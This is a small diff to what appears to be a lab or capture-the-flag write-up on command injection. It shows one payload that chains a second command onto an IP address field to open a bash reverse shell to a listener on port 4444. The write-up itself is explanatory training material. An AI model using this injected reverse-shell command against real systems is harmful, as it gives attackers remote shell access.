@@ -57,8 +57,9 @@ By appending an operator payload, the system command syntax was hijacked.
 ![Initial Access Foothold](images/foothold_lvl2.png)
   ```
 *Figure 4: Successfully catching the interactive shell session using a Netcat listener.*
+
 2. The following unified logical payload was delivered through the execution processing script:
-   ```text
+   ```
    192.168.0.21 && bash -i >& /dev/tcp/192.168.0.21/4444 0>&1
   <!-- 🖼️ PLACE SECOND IMAGE HERE -->
  ![Nmap Scan Results](images/sql_command2_lvl2.png)
